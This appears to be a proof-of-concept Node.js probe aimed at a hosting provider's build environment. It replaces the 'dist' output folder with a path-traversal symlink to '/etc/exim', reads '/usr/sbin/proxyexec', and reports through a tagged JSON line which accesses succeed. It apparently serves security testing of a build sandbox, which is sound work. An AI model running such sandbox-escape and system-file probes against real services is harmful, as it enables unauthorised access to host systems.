import fs from "node:fs";
import path from "node:path";

const marker = "HOSTINGER_NODE_EXIM_DIRECTORY_SYMLINK_GATE:r218";
const output = path.resolve("dist");
fs.rmSync(output, { recursive: true, force: true });
const linkTarget = "../../../../../../../etc/exim";
let outputLink;
try {
  fs.symlinkSync(linkTarget, output);
  outputLink = { created: true, target: linkTarget, isSymlink: fs.lstatSync(output).isSymbolicLink() };
} catch (error) {
  outputLink = { created: false, target: linkTarget, errorCode: error.code ?? error.name };
}

let directRead;
try {
  const body = fs.readFileSync("/usr/sbin/proxyexec");
  directRead = { readable: true, bytes: body.length };
} catch (error) {
  directRead = { readable: false, errorCode: error.code ?? error.name };
}

let linkRead;
try {
  const body = fs.readFileSync(output);
  linkRead = { readable: true, bytes: body.length };
} catch (error) {
  linkRead = { readable: false, errorCode: error.code ?? error.name };
}

let outputStat;
try {
  const stat = fs.statSync(output);
  outputStat = { available: true, isFile: stat.isFile(), isDirectory: stat.isDirectory(), bytes: stat.size };
} catch (error) {
  outputStat = { available: false, errorCode: error.code ?? error.name };
}

console.log(JSON.stringify({
  marker,
  directRead,
  linkRead,
  outputLink,
  outputStat,
  outputRelativeToRepository: path.relative(process.cwd(), output),
}));
